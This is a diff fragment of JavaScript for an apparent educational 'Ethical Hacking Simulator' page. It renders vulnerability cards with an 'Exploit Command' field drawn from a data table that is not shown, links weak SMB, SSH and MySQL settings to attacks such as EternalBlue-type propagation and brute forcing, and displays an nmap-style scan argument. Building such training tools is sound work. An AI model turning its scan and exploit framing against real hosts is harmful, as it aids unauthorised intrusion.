+                // Clear and repopulate version select
+                vulnVersionSelect.innerHTML = '';
+                versions.forEach(version => {
+                    const option = document.createElement('option');
+                    option.value = version;
+                    const vulnData = serviceDatabase[service]?.versions[version];
+                    const label = vulnData ? `${version} ${vulnData.risk === 'Low' ? '✅' : vulnData.risk === 'Medium' ? '⚠️' : '🔴'}` : version;
+                    option.textContent = label;
+                    vulnVersionSelect.appendChild(option);
+                });
+                
+                // Update options based on service
+                updateVulnOptions(service);
+                
+            } catch (error) {
+                console.error('Service change error:', error);
+            }
+        });
+    }
+    
+    function updateVulnOptions(service) {
+        try {
+            if (!vulnOptionsDiv) return;
+            
+            let optionsHTML = '';
+            switch(service) {
+                case 'Apache':
+                    optionsHTML = `
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-1" checked class="vuln-option">
+                            <span class="text-sm">Enable CGI scripts</span>
+                        </label>
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-2" class="vuln-option">
+                            <span class="text-sm">Enable Mod_CGI</span>
+                        </label>`;
+                    break;
+                case 'OpenSSH':
+                    optionsHTML = `
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-1" checked class="vuln-option">
+                            <span class="text-sm">Allow password authentication</span>
+                        </label>
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-2" class="vuln-option">
+                            <span class="text-sm">Enable root login</span>
+                        </label>`;
+                    break;
+                case 'SMB':
+                    optionsHTML = `
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-1" checked class="vuln-option">
+                            <span class="text-sm">Enable SMBv1</span>
+                        </label>
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-2" class="vuln-option">
+                            <span class="text-sm">Allow NULL sessions</span>
+                        </label>`;
+                    break;
+                case 'MySQL':
+                    optionsHTML = `
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-1" checked class="vuln-option">
+                            <span class="text-sm">Default root password</span>
+                        </label>
+                        <label class="flex items-center space-x-2">
+                            <input type="checkbox" id="vuln-option-2" class="vuln-option">
+                            <span class="text-sm">Remote access enabled</span>
+                        </label>`;
+                    break;
+            }
+            vulnOptionsDiv.innerHTML = optionsHTML;
+            
+        } catch (error) {
+            console.error('Update vuln options error:', error);
+        }
+    }
+    
+    if (analyzeVulnBtn) {
+        analyzeVulnBtn.addEventListener('click', () => {
+            try {
+                const service = vulnServiceSelect.value;
+                const version = vulnVersionSelect.value;
+                const resultsContainer = document.getElementById('vuln-results');
+                
+                if (!resultsContainer) {
+                    console.error('Vuln results container not found');
+                    return;
+                }
+                
+                const serviceData = serviceDatabase[service];
+                const versionData = serviceData?.versions[version];
+                
+                if (!serviceData || !versionData) {
+                    resultsContainer.innerHTML = '<div class="text-sm text-gray-400">No vulnerability data available for selected configuration.</div>';
+                    return;
+                }
+                
+                // Get additional option states
+                const option1 = document.getElementById('vuln-option-1')?.checked || false;
+                const option2 = document.getElementById('vuln-option-2')?.checked || false;
+                
+                // Build results HTML
+                let resultsHTML = `
+                    <div class="bg-gray-800 rounded-lg p-3 border ${versionData.risk === 'Low' ? 'border-gray-600' : versionData.risk === 'Medium' ? 'border-yellow-600' : 'border-red-600'}">
+                        <div class="flex items-start justify-between mb-2">
+                            <div>
+                                <div class="font-semibold text-green-400">${service}</div>
+                                <div class="text-sm text-gray-400">Version: ${version}</div>
+                            </div>
+                            <span class="text-xs px-2 py-1 rounded ${versionData.risk === 'Low' ? 'bg-green-600' : versionData.risk === 'Medium' ? 'bg-yellow-600' : 'bg-red-600'}">
+                                ${versionData.risk} Risk
+                            </span>
+                        </div>
+                        <ul class="list-disc list-inside space-y-1 text-sm mt-2">
+                            <li class="text-gray-300">${versionData.vulns[0]}</li>
+                            ${versionData.vulns.length > 1 ? `<li class="text-gray-300">${versionData.vulns[1]}</li>` : ''}
+                        </ul>
+                        <div class="mt-2 p-2 bg-gray-900 rounded">
+                            <div class="text-xs text-gray-500 mb-1">Exploit Command:</div>
+                            <code class="text-xs text-green-400 font-mono break-all">${versionData.exploit}</code>
+                        </div>
+                    </div>
+                `;
+                
+                // Add option-based findings
+                if (option1 && (service === 'SMB' || service === 'MySQL')) {
+                    resultsHTML += `
+                        <div class="bg-gray-800 rounded-lg p-3 border border-red-600 mt-2">
+                            <div class="text-sm font-semibold text-red-400">⚠️ Additional Weakness Found</div>
+                            <p class="text-sm text-gray-400 mt-1">${service === 'SMB' ? 'SMBv1 enabled - susceptible to Worm-like propagation (EternalBlue type attacks)' : 'Default credentials make brute forcing trivial'}</p>
+                        </div>`;
+                }
+                
+                if (option2 && service === 'OpenSSH') {
+                    resultsHTML += `
+                        <div class="bg-gray-800 rounded-lg p-3 border border-yellow-600 mt-2">
+                            <div class="text-sm font-semibold text-yellow-400">⚠️ Root Login Enabled</div>
+                            <p class="text-sm text-gray-400 mt-1">Direct root login allows brute-force attacks on root account</p>
+                        </div>`;
+                }
+                
+                resultsContainer.innerHTML = resultsHTML;
+                
+                console.log('Vulnerability analysis:', { service, version, option1, option2, risk: versionData.risk });
+                
+            } catch (error) {
+                console.error('Vulnerability analysis error:', error);
+                const resultsContainer = document.getElementById('vuln-results');
+                if (resultsContainer) {
+                    resultsContainer.innerHTML = `<div class="text-sm text-red-400">Analysis error: ${error.message}</div>`;
+                }
+            }
+        });
+    }
+
+    // ========================================
+    // Window Resize Handler
+    // ========================================
+    window.addEventListener('resize', debounce(() => {
+        try {
+            // Redraw network diagram
+            drawNetwork();
+            
+            // Update charts
+            if (dosChart) {
+                dosChart.resize();
+            }
+            
+        } catch (error) {
+            console.error('Resize error:', error);
+        }
+    }, 200));
+
+    // ========================================
+    // Initialization
+    // ========================================
+    document.addEventListener('DOMContentLoaded', () => {
+        try {
+            console.log('Ethical Hacking Simulator Initializing...');
+            
+            // Initialize network visualization
+            updateNetworkVisualization();
+            
+            // Initialize DoS chart
+            initializeDoSChart();
+            
+            // Update attack controls
+            updateAttackControls();
+            
+            // Initialize vulnerability options
+            updateVulnOptions('Apache');
+            
+            // Set initial command display
+            document.getElementById('command-display').textContent = '192.168.1.100 -sS -sV -p 1-1024';
+            
+            console.log('Simulator initialization complete');
+            
+            // Debug: log all interactive elements found
+            const interactiveElements = document.querySelectorAll('button, input[type="range"], input[type="checkbox"], input[type="radio"], select');
+            console.log('Interactive elements found:', interactiveElements.length);
+            
+        } catch (error) {
+            console.error('Initialization error:', error);
+        }
+    });
+    
+    // Handle page visibility changes
+    document.addEventListener('visibilitychange', () => {
+        try {
+            if (!document.hidden && dosChart) {
+                dosChart.resize();
+            }
+        } catch (error) {
+            console.error('Visibility change error:', error);
+        }
+    });
+    
+    </script>
+</body>
+</html>
